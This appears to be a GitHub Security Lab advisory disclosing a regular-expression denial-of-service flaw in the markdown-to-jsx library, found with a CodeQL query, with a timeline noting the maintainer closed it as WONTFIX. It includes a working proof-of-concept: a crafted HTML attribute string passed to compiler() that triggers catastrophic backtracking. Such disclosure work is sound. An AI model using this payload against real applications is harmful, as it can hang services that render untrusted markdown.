<header class="post-header d-block mb-6">
      ...
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-300: Regular Expression Denial of Service in markdown-to-jsx</h1>
...
<ul>
  ...
  <li>11/30/2020: closed as WONTFIX: <a href="https://github.com/probablyup/markdown-to-jsx/issues/351#issuecomment-735815194">“If it’s a ReDOS thing I don’t care, thanks.”</a></li>
</ul>
...
<p>This library parses markdown/HTML and outputs it as React components.</p>

<p>This vulnerability was found using a <a href="https://securitylab.github.com/tools/codeql/">CodeQL</a> query which identified the <code class="language-plaintext highlighter-rouge">ATTR_EXTRACTOR_R</code> regex used by the markdown parser as vulnerable.
<a href="https://lgtm.com/query/4077345999950269726/">Link to query run</a></p>

<h3 id="poc">PoC</h3>

<ul>
  <li>Install markdown-to-jsx (and React): <code class="language-plaintext highlighter-rouge">npm install markdown-to-jsx react</code></li>
  <li>Put the below in a <code class="language-plaintext highlighter-rouge">.js</code> file and run with node.</li>
</ul>

<pre><code class="language-JavaScript">const { compiler } = require('markdown-to-jsx');
compiler('&lt;a foobar="foo\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\!\\! /&gt;', {disableParsingRawHTML:false});
</code></pre>
...
<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-300</code> in any communication regarding this issue.</